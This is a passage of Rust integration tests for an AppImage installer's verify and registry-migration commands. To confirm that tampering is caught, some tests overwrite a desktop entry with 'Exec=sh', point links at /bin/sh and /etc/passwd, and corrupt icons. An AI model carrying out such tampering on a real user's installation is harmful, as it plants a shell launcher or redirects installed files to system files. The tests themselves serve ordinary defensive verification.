    let verify_ok_out = Command::new(bin)
        .args(["--verify", "--json"])
        .env("HOME", home.path())
        .env("XDG_DATA_HOME", &data_home)
        .output()
        .unwrap();
    assert!(verify_ok_out.status.success());
    let verify_ok: Value = serde_json::from_slice(&verify_ok_out.stdout).unwrap();
    assert_eq!(verify_ok["all_ok"], true);
    assert_eq!(verify_ok["ok_count"], 1);
    assert_eq!(verify_ok["failed_count"], 0);

    let verify_single_out = Command::new(bin)
        .args(["--verify", "legacyisoapp"])
        .env("HOME", home.path())
        .env("XDG_DATA_HOME", &data_home)
        .output()
        .unwrap();
    assert!(verify_single_out.status.success());

    let verify_strict_ok_out = Command::new(bin)
        .args(["--verify", "--strict", "--json"])
        .env("HOME", home.path())
        .env("XDG_DATA_HOME", &data_home)
        .output()
        .unwrap();
    assert!(
        verify_strict_ok_out.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&verify_strict_ok_out.stderr)
    );
    let verify_strict_ok: Value = serde_json::from_slice(&verify_strict_ok_out.stdout).unwrap();
    assert_eq!(verify_strict_ok["strict"], true);
    assert_eq!(verify_strict_ok["all_ok"], true);
    assert_eq!(
        verify_strict_ok["results"][0]["artifacts"]
            .as_array()
            .unwrap()
            .len(),
        4
    );

    let reg_json: Value =
        serde_json::from_slice(&fs::read(&layout.registry_path).unwrap()).unwrap();
    assert_eq!(reg_json["schema_version"], 2);
    assert!(reg_json["apps"][0]["desktop_file_sha256"].is_string());
    assert!(reg_json["apps"][0]["icon_sha256s"].is_object());

    let desktop_file = layout.desktop_entries_dir.join("legacyisoapp.desktop");
    let desktop_backup = fs::read(&desktop_file).unwrap();
    fs::write(
        &desktop_file,
        b"[Desktop Entry]\nType=Application\nName=Tampered\nExec=sh\n",
    )
    .unwrap();
    let verify_strict_desktop_tamper = Command::new(bin)
        .args(["--verify", "--strict", "--json"])
        .env("HOME", home.path())
        .env("XDG_DATA_HOME", &data_home)
        .output()
        .unwrap();
    assert!(!verify_strict_desktop_tamper.status.success());
    let strict_tamper_json: Value =
        serde_json::from_slice(&verify_strict_desktop_tamper.stdout).unwrap();
    assert_eq!(strict_tamper_json["all_ok"], false);
    assert_eq!(strict_tamper_json["results"][0]["status"], "artifact_error");
    assert_eq!(
        strict_tamper_json["results"][0]["artifacts"][0]["kind"],
        "desktop"
    );
    assert_eq!(
        strict_tamper_json["results"][0]["artifacts"][0]["ok"],
        false
    );
    assert!(
        strict_tamper_json["results"][0]["artifacts"][0]["detail"]
            .as_str()
            .unwrap()
            .contains("checksum mismatch")
    );
    fs::write(&desktop_file, &desktop_backup).unwrap();

    fs::remove_file(&desktop_file).unwrap();
    let verify_strict_desktop_fail = Command::new(bin)
        .args(["--verify", "--strict", "--json"])
        .env("HOME", home.path())
        .env("XDG_DATA_HOME", &data_home)
        .output()
        .unwrap();
    assert!(!verify_strict_desktop_fail.status.success());
    let strict_fail_json: Value =
        serde_json::from_slice(&verify_strict_desktop_fail.stdout).unwrap();
    assert_eq!(strict_fail_json["all_ok"], false);
    assert_eq!(strict_fail_json["results"][0]["status"], "artifact_error");
    assert_eq!(
        strict_fail_json["results"][0]["artifacts"][0]["kind"],
        "desktop"
    );
    assert_eq!(strict_fail_json["results"][0]["artifacts"][0]["ok"], false);
    fs::write(&desktop_file, desktop_backup).unwrap();

    let cli_link = layout.bin_dir.join("legacyisoapp");
    let cli_target = fs::read_link(&cli_link).unwrap();
    fs::remove_file(&cli_link).unwrap();
    symlink("/bin/sh", &cli_link).unwrap();
    let verify_strict_cli_fail = Command::new(bin)
        .args(["--verify", "--strict", "--json"])
        .env("HOME", home.path())
        .env("XDG_DATA_HOME", &data_home)
        .output()
        .unwrap();
    assert!(!verify_strict_cli_fail.status.success());
    let strict_cli_json: Value = serde_json::from_slice(&verify_strict_cli_fail.stdout).unwrap();
    assert_eq!(strict_cli_json["results"][0]["status"], "artifact_error");
    fs::remove_file(&cli_link).unwrap();
    symlink(cli_target, &cli_link).unwrap();

    let icon_file = layout
        .icons_hicolor_dir
        .join("256x256/apps/legacyisoapp.png");
    let icon_backup = fs::read(&icon_file).unwrap();
    let mut tampered_icon = icon_backup.clone();
    tampered_icon.push(0x00);
    fs::write(&icon_file, tampered_icon).unwrap();
    let verify_strict_icon_tamper = Command::new(bin)
        .args(["--verify", "--strict", "--json"])
        .env("HOME", home.path())
        .env("XDG_DATA_HOME", &data_home)
        .output()
        .unwrap();
    assert!(!verify_strict_icon_tamper.status.success());
    let strict_icon_tamper_json: Value =
        serde_json::from_slice(&verify_strict_icon_tamper.stdout).unwrap();
    assert_eq!(
        strict_icon_tamper_json["results"][0]["status"],
        "artifact_error"
    );

    fs::remove_file(&icon_file).unwrap();
    let verify_strict_icon_fail = Command::new(bin)
        .args(["--verify", "--strict", "--json"])
        .env("HOME", home.path())
        .env("XDG_DATA_HOME", &data_home)
        .output()
        .unwrap();
    assert!(!verify_strict_icon_fail.status.success());
    let strict_icon_json: Value = serde_json::from_slice(&verify_strict_icon_fail.stdout).unwrap();
    assert_eq!(strict_icon_json["results"][0]["status"], "artifact_error");
    fs::write(&icon_file, icon_backup).unwrap();

    let reg_v2_backup = fs::read(&layout.registry_path).unwrap();
    let mut v1_reg: Value = serde_json::from_slice(&reg_v2_backup).unwrap();
    v1_reg["schema_version"] = Value::from(1);
    if let Some(app_obj) = v1_reg["apps"][0].as_object_mut() {
        app_obj.remove("desktop_file_sha256");
        app_obj.remove("icon_sha256s");
    }
    fs::write(
        &layout.registry_path,
        serde_json::to_vec_pretty(&v1_reg).unwrap(),
    )
    .unwrap();
    let verify_v1_strict = Command::new(bin)
        .args(["--verify", "--strict", "--json"])
        .env("HOME", home.path())
        .env("XDG_DATA_HOME", &data_home)
        .output()
        .unwrap();
    assert!(
        verify_v1_strict.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&verify_v1_strict.stderr)
    );
    fs::write(&layout.registry_path, reg_v2_backup).unwrap();

    let installed_bin = layout.applications_dir.join("LegacyIso-1.0.AppImage");
    fs::write(&installed_bin, b"tampered-binary").unwrap();

    let verify_tampered_out = Command::new(bin)
        .args(["--verify", "--json"])
        .env("HOME", home.path())
        .env("XDG_DATA_HOME", &data_home)
        .output()
        .unwrap();
    assert!(!verify_tampered_out.status.success());
    let verify_tampered: Value = serde_json::from_slice(&verify_tampered_out.stdout).unwrap();
    assert_eq!(verify_tampered["all_ok"], false);
    assert_eq!(verify_tampered["failed_count"], 1);
    assert_eq!(verify_tampered["results"][0]["status"], "sha256_mismatch");

    fs::remove_file(&installed_bin).unwrap();
    symlink("/etc/passwd", &installed_bin).unwrap();
    let verify_symlink_out = Command::new(bin)
        .args(["--verify", "--json"])
        .env("HOME", home.path())
        .env("XDG_DATA_HOME", &data_home)
        .output()
        .unwrap();
    assert!(!verify_symlink_out.status.success());
    let verify_symlink: Value = serde_json::from_slice(&verify_symlink_out.stdout).unwrap();
    assert_eq!(verify_symlink["results"][0]["status"], "not_regular_file");

    fs::remove_file(&installed_bin).unwrap();
    let verify_missing_out = Command::new(bin)
        .args(["--verify", "--json"])
        .env("HOME", home.path())
        .env("XDG_DATA_HOME", &data_home)
        .output()
        .unwrap();
    assert!(!verify_missing_out.status.success());
    let verify_missing: Value = serde_json::from_slice(&verify_missing_out.stdout).unwrap();
    assert_eq!(verify_missing["results"][0]["status"], "missing");

    let dry_uninstall_json_out = Command::new(bin)
        .args(["-u", "--dry-run", "--json", "legacyisoapp"])
        .env("HOME", home.path())
        .env("XDG_DATA_HOME", &data_home)
        .output()
        .unwrap();
    assert!(dry_uninstall_json_out.status.success());
    let dry_uninstall_json: Value = serde_json::from_slice(&dry_uninstall_json_out.stdout).unwrap();
    assert_eq!(dry_uninstall_json["mode"], "uninstall");
    assert_eq!(dry_uninstall_json["dry_run"], true);
}

#[test]
fn cli_binary_exits_cleanly_without_panic_on_broken_pipe_and_nonblocking_fifo() {
    let bin = env!("CARGO_BIN_EXE_install-appimage");
    let home = TempDir::new().unwrap();
    let data_home = home.path().join(".local/share");
    let layout = XdgLayout::try_from_env_values(home.path(), Some(&data_home)).unwrap();

    for args in [
        vec!["--generate-completion", "bash"],
        vec!["--generate-man"],
        vec!["--doctor", "--json"],
    ] {
        let mut child = Command::new(bin)
            .args(&args)
            .env("HOME", home.path())
            .env("XDG_DATA_HOME", &data_home)
            .stdin(Stdio::null())
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .spawn()
            .unwrap();
        drop(child.stdout.take());
        let output = child.wait_with_output().unwrap();
        assert!(
            output.status.success(),
            "args {:?} failed with status {}: {}",
            args,
            output.status,
            String::from_utf8_lossy(&output.stderr)
        );
        let stderr_text = String::from_utf8_lossy(&output.stderr);
        assert!(
            !stderr_text.contains("panicked") && stderr_text.trim().is_empty(),
            "unexpected stderr for {:?}: {}",
            args,
            stderr_text
        );
    }

    if let Some(mkfifo_bin) = resolve_trusted_executable("mkfifo") {
        let fifo_dir = TempDir::new().unwrap();
        let fifo_app = fifo_dir.path().join("pipe.AppImage");
        let mk_status = Command::new(&mkfifo_bin).arg(&fifo_app).status().unwrap();
        assert!(mk_status.success());

        let extractor = StaticAppImageExtractor;
        assert!(matches!(
            extractor.inspect_and_extract(&fifo_app, None),
            Err(DomainError::NotARegularFile(_))
        ));

        fs::create_dir_all(&layout.applications_dir).unwrap();
        let managed_fifo = layout.applications_dir.join("managed-pipe.AppImage");
        let mk_managed = Command::new(&mkfifo_bin)
            .arg(&managed_fifo)
            .status()
            .unwrap();
        assert!(mk_managed.success());

        let fs_adapter = XdgFileSystemAdapter;
        assert!(matches!(
            fs_adapter.hash_managed_regular_file(&layout.applications_dir, &managed_fifo),
            Ok(ManagedFileHashProbe::NotRegularFile(_))
        ));
    }
}

#[test]
fn cli_e2e_migrates_v1_registry_to_v2_and_normalizes_env_paths() {
    let bin = env!("CARGO_BIN_EXE_install-appimage");
    let home = TempDir::new().unwrap();
    let data_home = home.path().join(".local/share");
    let layout = XdgLayout::try_from_env_values(home.path(), Some(&data_home)).unwrap();

    let slash = '/';
    let noisy_home = format!("{}{slash}{slash}{slash}", home.path().display());
    let noisy_data_home = format!("{}/.local{slash}{slash}share{slash}", home.path().display());

    let src_dir = TempDir::new().unwrap();
    let iso_app = src_dir.path().join("MigrateIso-1.0.AppImage");
    build_type1_iso_appimage(&iso_app, false);

    let install_out = Command::new(bin)
        .arg(&iso_app)
        .env("HOME", &noisy_home)
        .env("XDG_DATA_HOME", &noisy_data_home)
        .output()
        .unwrap();
    assert!(
        install_out.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&install_out.stderr)
    );

    let reg_v2_bytes = fs::read(&layout.registry_path).unwrap();
    let mut v1_doc: Value = serde_json::from_slice(&reg_v2_bytes).unwrap();
    v1_doc["schema_version"] = Value::from(1);
    if let Some(app_obj) = v1_doc["apps"][0].as_object_mut() {
        app_obj.remove("desktop_file_sha256");
        app_obj.remove("icon_sha256s");
    }
    let v1_bytes = serde_json::to_vec_pretty(&v1_doc).unwrap();
    fs::write(&layout.registry_path, &v1_bytes).unwrap();

    let dry_out = Command::new(bin)
        .args(["--migrate-registry", "--dry-run", "--json"])
        .env("HOME", &noisy_home)
        .env("XDG_DATA_HOME", &noisy_data_home)
        .output()
        .unwrap();
    assert!(
        dry_out.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&dry_out.stderr)
    );
    let dry_json: Value = serde_json::from_slice(&dry_out.stdout).unwrap();
    assert_eq!(dry_json["mode"], "migrate_registry");
    assert_eq!(dry_json["dry_run"], true);
    assert_eq!(dry_json["previous_schema_version"], 1);
    assert_eq!(dry_json["target_schema_version"], 2);
    assert_eq!(dry_json["registry_written"], false);
    assert_eq!(dry_json["already_up_to_date"], false);
    assert_eq!(dry_json["migrated_count"], 1);
    assert_eq!(dry_json["failed_count"], 0);

    let disk_after_dry: Value =
        serde_json::from_slice(&fs::read(&layout.registry_path).unwrap()).unwrap();
    assert_eq!(disk_after_dry["schema_version"], 1);

    let real_out = Command::new(bin)
        .args(["--migrate-registry", "--json"])
        .env("HOME", &noisy_home)
        .env("XDG_DATA_HOME", &noisy_data_home)
        .output()
        .unwrap();
    assert!(
        real_out.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&real_out.stderr)
    );
    let real_json: Value = serde_json::from_slice(&real_out.stdout).unwrap();
    assert_eq!(real_json["registry_written"], true);
    assert_eq!(real_json["already_up_to_date"], false);
    assert_eq!(real_json["migrated_count"], 1);
    assert_eq!(real_json["failed_count"], 0);
    assert_eq!(real_json["entries"][0]["status"], "migrated");
    assert_eq!(real_json["entries"][0]["desktop_hash_added"], true);
    assert_eq!(real_json["entries"][0]["icons_hashed"], 1);

    let disk_after_real: Value =
        serde_json::from_slice(&fs::read(&layout.registry_path).unwrap()).unwrap();
    assert_eq!(disk_after_real["schema_version"], 2);
    assert!(disk_after_real["apps"][0]["desktop_file_sha256"].is_string());
    assert!(
        disk_after_real["apps"][0]["icon_sha256s"]
            .as_object()
            .unwrap()
            .len()
            == 1
    );

    let second_out = Command::new(bin)
        .args(["--migrate-registry", "--json"])
        .env("HOME", &noisy_home)
        .env("XDG_DATA_HOME", &noisy_data_home)
        .output()
        .unwrap();
    assert!(second_out.status.success());
    let second_json: Value = serde_json::from_slice(&second_out.stdout).unwrap();
    assert_eq!(second_json["already_up_to_date"], true);
    assert_eq!(second_json["registry_written"], false);
    assert_eq!(second_json["unchanged_count"], 1);
    assert_eq!(second_json["entries"][0]["status"], "unchanged");

    let verify_ok = Command::new(bin)
        .args(["--verify", "--strict", "--json"])
        .env("HOME", &noisy_home)
        .env("XDG_DATA_HOME", &noisy_data_home)
        .output()
        .unwrap();
    assert!(
        verify_ok.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&verify_ok.stderr)
    );

    let desktop_path = layout.desktop_entries_dir.join("legacyisoapp.desktop");
    let desktop_backup = fs::read(&desktop_path).unwrap();
    fs::write(
        &desktop_path,
        b"[Desktop Entry]\nType=Application\nName=Evil\nExec=sh\n",
    )
    .unwrap();
    let verify_desktop_tamper = Command::new(bin)
        .args(["--verify", "--strict", "--json"])
        .env("HOME", &noisy_home)
        .env("XDG_DATA_HOME", &noisy_data_home)
        .output()
        .unwrap();
    assert!(!verify_desktop_tamper.status.success());
    let tamper_desktop_json: Value = serde_json::from_slice(&verify_desktop_tamper.stdout).unwrap();
    assert_eq!(
        tamper_desktop_json["results"][0]["status"],
        "artifact_error"
    );
    fs::write(&desktop_path, desktop_backup).unwrap();

    let icon_path = layout
        .icons_hicolor_dir
        .join("256x256/apps/legacyisoapp.png");
    let icon_backup = fs::read(&icon_path).unwrap();
    fs::write(&icon_path, b"TAMPERED-ICON").unwrap();
    let verify_icon_tamper = Command::new(bin)
        .args(["--verify", "--strict", "--json"])
        .env("HOME", &noisy_home)
        .env("XDG_DATA_HOME", &noisy_data_home)
        .output()
        .unwrap();
    assert!(!verify_icon_tamper.status.success());
    let tamper_icon_json: Value = serde_json::from_slice(&verify_icon_tamper.stdout).unwrap();
    assert_eq!(tamper_icon_json["results"][0]["status"], "artifact_error");

    fs::write(&layout.registry_path, &v1_bytes).unwrap();
    fs::remove_file(&icon_path).unwrap();
    let fail_migrate = Command::new(bin)
        .args(["--migrate-registry", "--json"])
        .env("HOME", &noisy_home)
        .env("XDG_DATA_HOME", &noisy_data_home)
        .output()
        .unwrap();
    assert!(!fail_migrate.status.success());
    let fail_json: Value = serde_json::from_slice(&fail_migrate.stdout).unwrap();
    assert_eq!(fail_json["registry_written"], false);
    assert_eq!(fail_json["failed_count"], 1);
    assert_eq!(fail_json["entries"][0]["status"], "error");
    assert_eq!(fs::read(&layout.registry_path).unwrap(), v1_bytes);
    fs::write(&icon_path, icon_backup).unwrap();
}
